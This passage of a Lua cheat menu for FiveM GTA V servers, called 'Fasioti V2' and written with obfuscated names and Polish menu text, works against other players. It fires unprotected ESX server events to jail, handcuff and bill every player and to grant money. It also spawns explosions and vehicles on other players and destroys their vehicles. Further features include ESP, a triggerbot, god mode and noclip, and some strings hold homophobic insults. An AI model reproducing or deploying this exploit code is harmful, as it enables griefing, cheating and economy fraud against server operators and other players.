		coroutine.yield(id)
		next, id = moveFunc(iter)
	  until not next
	  
	  enum.destructor, enum.handle = nil, nil
	  disposeFunc(iter)
	end)
  end

  function EnumerateObjects()
	return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end

  function EnumeratePeds()
	return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

  function EnumeratePickups()
	return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end

function RequestControl(entity)
	local Waiting = 0
	NetworkRequestControlOfEntity(entity)
	while not NetworkHasControlOfEntity(entity) do
		Waiting = Waiting + 100
		Citizen.Wait(100)
		if Waiting > 5000 then
			drawNotification("Hung for 5 seconds, killing to prevent issues...")
		end
	end
end

function getEntity(player)
	local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
	return entity
end

function GetInputMode()
	return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
	SetTextEntry_2("STRING")
	AddTextComponentString(m_text)
	DrawSubtitleTimed(showtime, 1)
end




ShowHudComponentThisFrame(14)

Citizen.CreateThread(function() 
	local headId = {}
	while true do
		Citizen.Wait(1)
		if poiytriOGRDUNIDhuthdghd then
		
			for id = 0, 128 do
				if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
					ped = GetPlayerPed(id)
					blip = GetBlipFromEntity(ped)

				
					
					headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
					wantedLvl = GetPlayerWantedLevel(id)

					
					if wantedLvl then
						SetMpGamerTagVisibility(headId[id], 7, true)
						SetMpGamerTagWantedLevel(headId[id], wantedLvl)
					else
						SetMpGamerTagVisibility(headId[id], 7, false)
					end

				
					if NetworkIsPlayerTalking(id) then
						SetMpGamerTagVisibility(headId[id], 9, true) 
					else
						SetMpGamerTagVisibility(headId[id], 9, false)
					end

					

					if not DoesBlipExist(blip) then 
						blip = AddBlipForEntity(ped)
						SetBlipSprite(blip, 1)
						ShowHeadingIndicatorOnBlip(blip, true)
					else
						veh = GetVehiclePedIsIn(ped, false)
						blipSprite = GetBlipSprite(blip)
						if not GetEntityHealth(ped) then
							if blipSprite ~= 274 then
								SetBlipSprite(blip, 274)
								ShowHeadingIndicatorOnBlip(blip, false)
							end
						elseif veh then
							vehClass = GetVehicleClass(veh)
							vehModel = GetEntityModel(veh)
							if vehClass == 15 then
								if blipSprite ~= 422 then
									SetBlipSprite(blip, 422)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehClass == 8 then
								if blipSprite ~= 226 then
									SetBlipSprite(blip, 226)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehClass == 16 then
								if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then
									if blipSprite ~= 424 then
										SetBlipSprite(blip, 424)
										ShowHeadingIndicatorOnBlip(blip, false) 
									end
								elseif blipSprite ~= 423 then
									SetBlipSprite(blip, 423)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehClass == 14 then
								if blipSprite ~= 427 then
									SetBlipSprite(blip, 427)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then 
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("limo2") then
								if blipSprite ~= 460 then
									SetBlipSprite(blip, 460)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("rhino") then
								if blipSprite ~= 421 then
									SetBlipSprite(blip, 421)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then
								if blipSprite ~= 318 then
									SetBlipSprite(blip, 318)
									ShowHeadingIndicatorOnBlip(blip, false)
								end
							elseif vehModel == GetHashKey("pbus") then 
								if blipSprite ~= 513 then
									SetBlipSprite(blip, 513)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then
								if blipSprite ~= 471 then
									SetBlipSprite(blip, 471)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
								if blipSprite ~= 481 then
									SetBlipSprite(blip, 481)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
								if blipSprite ~= 426 then
									SetBlipSprite(blip, 426)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("taxi") then 
								if blipSprite ~= 198 then
									SetBlipSprite(blip, 198)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
								or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
								or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
								if blipSprite ~= 56 then
									SetBlipSprite(blip, 56)
									ShowHeadingIndicatorOnBlip(blip, false) 
								end
							elseif blipSprite ~= 1 then 
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true)
							end

							
							passengers = GetVehicleNumberOfPassengers(veh)

							if passengers then
								if not IsVehicleSeatFree(veh, -1) then
									passengers = passengers + 1
								end
								ShowNumberOnBlip(blip, passengers)
							else
								HideNumberOnBlip(blip)
							end
						else
							
							HideNumberOnBlip(blip)
							if blipSprite ~= 1 then
								SetBlipSprite(blip, 1)
								ShowHeadingIndicatorOnBlip(blip, true)
							end
						end
						
						SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) 
						SetBlipNameToPlayerName(blip, id)
						SetBlipScale(blip,  0.85) 

						
						if IsPauseMenuActive() then
							SetBlipAlpha( blip, 255 )
						else
							x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
							x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
							distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
							

							if distance < 0 then
								distance = 0
							elseif distance > 255 then
								distance = 255
							end
							SetBlipAlpha(blip, distance)
						end
					end
				end
			end
		else
			for id = 0, 128 do
				ped = GetPlayerPed(id)
				blip = GetBlipFromEntity(ped)
				if DoesBlipExist(blip) then
					RemoveBlip(blip)
				end
				if IsMpGamerTagActive(headId[id]) then
					RemoveMpGamerTag(headId[id])
				end
			end
		end
	end
end)

Citizen.CreateThread(
	function()
		while Enabled do
			Citizen.Wait(0)
			SetPlayerInvincible(PlayerId(), Godmode)
			SetEntityInvincible(PlayerPedId(), Godmode)
			if SuperJump then
				SetSuperJumpThisFrame(PlayerId())
			end
			
			if ePunch then
				SetExplosiveMeleeThisFrame(PlayerId())
			end

			if InfStamina then
				RestorePlayerStamina(PlayerId(), 1.0)
			end

			if Invisible then
				SetEntityVisible(GetPlayerPed(-1), false, 0)
			else
				SetEntityVisible(GetPlayerPed(-1), true, 0)
				
			if fastrun then
				SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
				SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
			else
				SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
				SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
	end
end


			if wheisgfvdnbSGBiusGsgs then
				local wheisgfvdnbSGBiusGsgsVehicle = "Freight"
				local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Vehicle Gun Enabled!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
						if IsPedShooting(GetPlayerPed(-1)) then
							while not HasModelLoaded(GetHashKey(wheisgfvdnbSGBiusGsgsVehicle)) do
								Citizen.Wait(0)
								RequestModel(GetHashKey(wheisgfvdnbSGBiusGsgsVehicle))
							end
							local veh = CreateVehicle(GetHashKey(wheisgfvdnbSGBiusGsgsVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
							SetEntityAsNoLongerNeeded(veh)
							SetVehicleForwardSpeed(veh, 150.0)
						end
					end
				end
			end

			if DeleteGun then
				local gotEntity = getEntity(PlayerId())
				if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
					drawNotification("~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
					GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
					SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
					if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
						if IsPlayerFreeAiming(PlayerId()) then
							if IsEntityAPed(gotEntity) then
								if IsPedInAnyVehicle(gotEntity, true) then
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
										DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								else
									if IsControlJustReleased(1, 142) then
										SetEntityAsMissionEntity(gotEntity, 1, 1)
										DeleteEntity(gotEntity)
										drawNotification("~g~Deleted!")
									end
								end
							else
								if IsControlJustReleased(1, 142) then
									SetEntityAsMissionEntity(gotEntity, 1, 1)
									DeleteEntity(gotEntity)
									drawNotification("~g~Deleted!")
								end
							end
						end
					end
				end
			end

			if aglKSislalhgjna then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
						NetworkRequestControlOfEntity(vehicle)
						SetVehicleUndriveable(vehicle,true)
						SetVehicleEngineHealth(vehicle, 100)
					end
				end
			end
			
						if ahsaahcufgagfa then
				for i = 0, 128 do
						TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
						TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
						TriggerServerEvent('cuffServer', GetPlayerServerId(i))
						TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
						TriggerServerEvent('esx_handcuffs:cuffing', GetPlayerServerId(i))
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
					end
				end
	  
			if stoiypstyiuotumkmiotisiu then
				for vehicle in EnumerateVehicles() do
					if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
						NetworkRequestControlOfEntity(vehicle)
						NetworkExplodeVehicle(vehicle, true, true, false)
					end
				end
			end

			if afkasoegpoGUIOESWG then
				for i = 0, 128 do
					if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
						local ra = RGBRainbow(1.0)
						local pPed = GetPlayerPed(i)
						local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
						local x, y, z = table.unpack(GetEntityCoords(pPed))
						local message =
							"~g~~h~" ..
							GetPlayerName(i) ..
										"\n~h~~b~ Dist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, false), 1)
				
						DrawText3D(x, y, z + 1.0, message, 255, 255, 255)

						LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
						LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
					end
				end
			end

			if supergrip then
				SetHandlingInt(GetVehiclePedIsUsing(PlayerPedId()), CHandlingData, fTractionCurveMin, 1000000)
			end

			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end

			if tdgjIDTJHREIUhs then
                for i = 0, 128 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			if SGEOSGnioshnigs then
				for i = 0, 128 do
				TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 9999999999 * 60, geje, 1337)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 999999 * 60, "siema geje")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, " ale gej ")
					end
				end

			if iuyftzmDHntoyih then
				for i = 0, 128 do
						TriggerServerEvent('esx_truckerjob:pay', 9999999999)
						TriggerServerEvent('AdminMenu:giveCash', 9999999999)
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "jestes gejem", 10000000)
				end
			end
			
			if aafrkwnsafjiaugbyGa then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
				CreateVehicle(GetHashKey(avion), 0, 0, -10, true, true)
				CreateVehicle(GetHashKey(avion), 0, 0, -50, true, true)
				CreateVehicle(GetHashKey(avion), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(avion2), 0, 3, -1000, true, true)
				CreateVehicle(GetHashKey(avion2), 1621, 0, -50, true, true)
				CreateVehicle(GetHashKey(avion2), 1242, 1, -100, true, true)
				CreateVehicle(GetHashKey(camion), 612, 4, -10, true, true)
				CreateVehicle(GetHashKey(camion), 1234, 0, -50, true, true)
				CreateVehicle(GetHashKey(camion), 0, 0, -100, true, true)
				CreateVehicle(GetHashKey(random), 512, 1233, -10, true, true)
				CreateVehicle(GetHashKey(random), 155, 2, -50, true, true)
				CreateVehicle(GetHashKey(random), 333, 0, -100, true, true)
				CreateVehicle(GetHashKey(heli), -121, 100, -10, true, true)
				CreateVehicle(GetHashKey(heli), -121, 2555, -50, true, true)
				CreateVehicle(GetHashKey(heli), -121, 123, -100, true, true)
			end

			if aefiIUGFbesuGnswagtha then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
                for i = 0, 128 do
						while not HasModelLoaded(GetHashKey(avion)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(avion))
						end
						Citizen.Wait(200)

						local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
			end

			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 118) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 109) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end

			if TriggerBot then
				local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
				if Aiming then
					if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
						pdocisaduafuGFNAEgg(Entity)
					end
				end
			end

			if atrfkorsoiNSIOG then
				SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
				local gotEntity = getEntity(PlayerId())
				if IsEntityAPed(gotEntity) then
					if IsPedInAnyVehicle(gotEntity, true) then
						if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
							if IsControlJustReleased(1, 69) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						else
							if IsControlJustReleased(1, 142) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						end
					end
				elseif IsEntityAVehicle(gotEntity) then
					if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
						if IsControlJustReleased(1, 69) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					else
						if IsControlJustReleased(1, 142) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					end
				end
			else
				SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
			end
 
			if tdgjIDTJHREIUhs then
                for i = 0, 64 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			DisplayRadar(true)

			if uiURTIJOUJkruioy then
				local ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			end

			if Noclip then
				local currentSpeed = 2
				local noclipEntity =
					IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityInvincible(PlayerPedId(), true)

				local newPos = GetEntityCoords(entity)

				DisableControlAction(0, 32, true) --MoveUpOnly
				DisableControlAction(0, 268, true) --MoveUp

				DisableControlAction(0, 31, true) --MoveUpDown

				DisableControlAction(0, 269, true) --MoveDown
				DisableControlAction(0, 33, true) --MoveDownOnly

				DisableControlAction(0, 266, true) --MoveLeft
				DisableControlAction(0, 34, true) --MoveLeftOnly

				DisableControlAction(0, 30, true) --MoveLeftRight

				DisableControlAction(0, 267, true) --MoveRight
				DisableControlAction(0, 35, true) --MoveRightOnly

				DisableControlAction(0, 44, true) --Cover
				DisableControlAction(0, 20, true) --MultiplayerInfo

				local yoff = 0.0
				local zoff = 0.0

				if GetInputMode() == "MouseAndKeyboard" then
					if IsDisabledControlPressed(0, 32) then
						yoff = 0.5
					end
					if IsDisabledControlPressed(0, 33) then
						yoff = -0.5
					end
					if IsDisabledControlPressed(0, 34) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
					end
					if IsDisabledControlPressed(0, 35) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
					end
					if IsDisabledControlPressed(0, 44) then
						zoff = 0.21
					end
					if IsDisabledControlPressed(0, 20) then
						zoff = -0.21
					end
				end

				newPos =
					GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

				local heading = GetEntityHeading(noclipEntity)
				SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
				SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
				SetEntityHeading(noclipEntity, heading)

				SetEntityCollision(noclipEntity, false, false)
				SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

				FreezeEntityPosition(noclipEntity, false)
				SetEntityInvincible(noclipEntity, false)
				SetEntityCollision(noclipEntity, true, true)
			end
		end
	end
)

function GetPlayers()
	local players = {}

	for i = 0, 31 do
		if NetworkIsPlayerActive(i) then
			table.insert(players, i)
		end
	end

	return players
end


function uoityuNUJHTMHnthijNH(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1
		local player = GetPlayerName(PlayerId())


		gesraGSRKGoiwsrrswg.afgsrgiuasbGIUSEDRg("MainMenu", "~c~Fasioti ~p~V2")
		gesraGSRKGoiwsrrswg.SetSubTitle("MainMenu", 'WERSJA V2! GRACZ: ~p~['..player..']')
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("SelfMenu", "MainMenu", "PlayerMenu")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("World", "MainMenu", "World")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("Fuck", "MainMenu", "Fuck")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("VehMenu", "MainMenu", "Vehicle Menu")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("ServerMenu", "MainMenu", "LUA Execution")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("TworcyMenu", "MainMenu", "tworcy")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("TeleportMenu", "MainMenu", "TeleportRawQ Menu")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("WepMenu", "MainMenu", "Weapon Menu")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("ESXBoss", "ServerMenu", "ESX Boss Menus")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("ESXMoney", "ServerMenu", "Money Options")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("ESXMisc", "ServerMenu", "ESX Misc Options")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("ESXDrugs", "ServerMenu", "ESX Drugs")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("MiscServerOptions", "ServerMenu", "Misc Server Options")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("OpcjeZmianyPeda", "MainMenu", "~h~» ~h~~y~∑ ~h~~y~Opcje zmiany pedów")
		gesraGSRKGoiwsrrswg.azsfAEIFGbauifag("OpcjeMenu", "MainMenu", "~h~» ~h~~y~∑ ~h~~s~Opcje zmiany Menu")

		local SelectedPlayer

		while Enabled do
			if gesraGSRKGoiwsrrswg.IsMenuOpened("MainMenu") then
				drawNotification('~s~∑ Witam w menu ~r~FASIOTI! ~s~Zapoznaj sie z nowymi ~r~funkcjami!')
				   if gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~r~∑ ~h~~c~Opcje Gracza", "SelfMenu", "👑") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~p~∑ ~h~~c~Opcje Podglądania", "OnlinePlayerMenu", "📋") then
				  elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~m~∑ ~h~~c~Opcje Gry", "World", "🌎") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~b~∑ ~h~~c~Opcje Teleportu", "TeleportMenu", "✈") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~g~∑ ~h~~c~Opcje Samochodu", "VehMenu", "🔧") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~o~∑ ~h~~c~Opcje Broni", "WepMenu", "🔫") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~u~∑ ~h~~c~Opcje Rozwalania", "Fuck", "💉") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~y~∑ ~h~~c~Opcje zmiany pedów", "OpcjeZmianyPeda", "👘") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~s~∑ ~h~~c~Opcje zmiany Menu", "OpcjeMenu", "⚙") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~» ~h~~g~$ ~h~~g~LUA MONEY OPTIONS", "ServerMenu", "💰") then
				elseif gesraGSRKGoiwsrrswg.MenuButton("~h~~r~WYLACZ MENU!!!!!!!!!") then
				Enabled = False
				end
				
				
			
			gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("bizness") then
			
			gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("OpcjeZmianyPeda") then
			if gesraGSRKGoiwsrrswg.Button("XD") then
			print"XD"
            end
			
			gesraGSRKGoiwsrrswg.Display()
			elseif gesraGSRKGoiwsrrswg.IsMenuOpened("OpcjeMenu") then
			if gesraGSRKGoiwsrrswg.Button("~h~~r~WYLACZ MENU!!!!!!!!!") then
			Enabled = False
            end

